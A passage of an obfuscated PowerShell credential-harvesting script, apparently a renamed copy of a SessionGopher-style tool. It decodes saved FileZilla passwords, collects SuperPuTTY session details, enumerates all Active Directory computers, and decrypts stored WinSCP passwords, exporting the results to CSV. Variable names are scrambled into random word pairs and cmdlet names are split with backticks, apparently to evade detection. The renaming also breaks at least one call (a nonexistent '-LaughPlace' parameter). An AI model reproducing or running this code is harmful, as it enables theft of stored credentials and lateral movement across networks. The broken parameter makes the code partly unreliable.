  } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
  
  # base64_decode the stored encoded session passwords, and decode protocol
  foreach ($MatchFound in $SoupSoup) {
      $MatchFound.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($MatchFound.Password))
      if ($MatchFound.Protocol -eq "0") {
        $MatchFound.Protocol = "Use FTP over TLS if available"
      } elseif ($MatchFound.Protocol -eq 1) {
        $MatchFound.Protocol = "Use SFTP"
      } elseif ($MatchFound.Protocol -eq 3) {
        $MatchFound.Protocol = "Require implicit FTP over TLS"
      } elseif ($MatchFound.Protocol -eq 4) {
        $MatchFound.Protocol = "Require explicit FTP over TLS"
      } elseif ($MatchFound.Protocol -eq 6) {
        $MatchFound.Protocol = "Only use plain FTP (insecure)"
      } 
  }

  if ($CellarSore) {
    $SoupSoup | Export-CSV -Append -Path ($ReignQuick + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $SoupSoup | Format-List | Out-String
  }

  # Add the array of FileZilla session objects to the target user object
  $CommonSpill | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -LaughPlace $SoupSoup

} # ProcessFileZillaFile

function ProcessSuperPuTTYFile($BadgeWord) {

  foreach($DullOval in $BadgeWord.ArrayOfSessionData.SessionData) {

    foreach ($FluffyMisty in $DullOval) { 
      if ($FluffyMisty -ne $null) {

        $SwingDusty = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"

        $SwingDusty."Source" = $MonkeySleep
        $SwingDusty."SessionId" = $FluffyMisty.SessionId
        $SwingDusty."SessionName" = $FluffyMisty.SessionName
        $SwingDusty."Host" = $FluffyMisty.Host
        $SwingDusty."Username" = $FluffyMisty.Username
        $SwingDusty."ExtraArgs" = $FluffyMisty.ExtraArgs
        $SwingDusty."Port" = $FluffyMisty.Port
        $SwingDusty."PuTTY Session" = $FluffyMisty.PuttySession

        [void]$PoisedHoney.Add($SwingDusty)
      } 
    }

  } # ForEach SuperPuTTYSessions

  if ($CellarSore) {
    $PoisedHoney | Export-CSV -Append -Path ($ReignQuick + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $PoisedHoney | Out-String
  }

  # Add the array of SuperPuTTY session objects to the target user object
  $CommonSpill | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -LaughPlace $PoisedHoney

} # ProcessSuperPuTTYFile

####################################################################################
####################################################################################
## WinSCP Deobfuscation Helper Functions
####################################################################################
####################################################################################

# Gets all domain-joined computer names and properties in one object
function GetComputersFromActiveDirectory {

  $MarketArm = "computer"
  $PoliteSlimy = new`-`obje`ct System.DirectoryServices.DirectoryEntry
  $RoofRepeat = new`-`obje`ct System.DirectoryServices.DirectorySearcher
  $RoofRepeat.SearchRoot = $PoliteSlimy
  $RoofRepeat.Filter = ("(objectCategory=$MarketArm)")

  $HorsesWorry = "name"

  foreach ($FaultyCat in $HorsesWorry){$RoofRepeat.PropertiesToLoad.Add($FaultyCat)}

  return $RoofRepeat.FindAll()

}

function DecryptNextCharacterWinSCP($GaudyFly) {

  # Creates an object with flag and remainingPass properties
  $FuelBattle = "" | Select-Object -Property flag,remainingPass

  # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
  $RitzyStore = ("0123456789ABCDEF".indexOf($GaudyFly[0]) * 16)
  $DucksGaudy = "0123456789ABCDEF".indexOf($GaudyFly[1])

  $ClammyWicked = $RitzyStore + $DucksGaudy

  $WeekHead = (((-bnot ($ClammyWicked -bxor $DependMuscle)) % 256) + 256) % 256

  $FuelBattle.flag = $WeekHead
  $FuelBattle.remainingPass = $GaudyFly.Substring(2)

  return $FuelBattle

}

function DecryptWinSCPPassword($MassReduce, $BaseEffect, $AbjectElated) {

  $SquashStingy = 255
  $DependMuscle = 163

  $FlapForce = 0
  $QuickArrest =  $MassReduce + $BaseEffect
  $WinkFace = DecryptNextCharacterWinSCP($AbjectElated)

  $ExistLame = $WinkFace.flag 

  if ($WinkFace.flag -eq $SquashStingy) {
    $WinkFace.remainingPass = $WinkFace.remainingPass.Substring(2)
    $WinkFace = DecryptNextCharacterWinSCP($WinkFace.remainingPass)
  }

  $FlapForce = $WinkFace.flag

  $WinkFace = DecryptNextCharacterWinSCP($WinkFace.remainingPass)
  $WinkFace.remainingPass = $WinkFace.remainingPass.Substring(($WinkFace.flag * 2))

  $LandIce = ""
  for ($FaultyCat=0; $FaultyCat -lt $FlapForce; $FaultyCat++) {
    $WinkFace = (DecryptNextCharacterWinSCP($WinkFace.remainingPass))
    $LandIce += [char]$WinkFace.flag
  }

  if ($ExistLame -eq $SquashStingy) {
    return $LandIce.Substring($QuickArrest.length)
  }

  return $LandIce

}
